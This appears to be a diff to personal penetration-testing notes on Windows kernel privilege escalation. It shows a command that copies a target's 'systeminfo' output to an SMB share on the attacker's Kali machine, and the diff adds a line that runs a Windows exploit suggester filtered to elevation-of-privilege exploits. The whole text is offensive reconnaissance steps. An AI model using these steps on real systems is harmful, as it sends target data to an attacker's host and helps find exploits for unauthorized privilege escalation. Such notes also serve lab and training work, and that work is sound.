@@ -1,3 +1,4 @@
 Kernel Exploit:
 
 systeminfo > \\ip\sharename\systeminfo.txt   ---> to send it to kali in smb share
+python widowsexploitsuggester.py systeminfo.txt -i 'Elevationof Privilege' --exploits-only | more
